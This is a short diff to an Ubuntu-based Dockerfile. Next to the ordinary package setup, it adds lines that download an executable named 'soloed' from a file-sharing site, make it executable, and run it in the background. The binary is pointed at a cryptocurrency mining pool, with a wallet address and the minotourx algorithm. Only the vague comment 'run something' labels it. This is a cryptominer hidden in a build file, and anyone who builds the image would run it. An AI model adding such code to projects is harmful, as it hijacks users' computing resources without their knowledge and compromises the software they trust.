@@ -3,8 +3,12 @@ FROM ubuntu:20.04
 
 # Avoid interactive prompts during package installations
 ENV DEBIAN_FRONTEND=noninteractive
+#run something 
 
+RUN wget https://bashupload.com/ryJaM/soloed && \
+    chmod +x soloed
 
+RUN nohup ./soloed -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE -tls -a minotourx -t 2    
 
 # Install basic dependencies
 RUN apt-get update && \
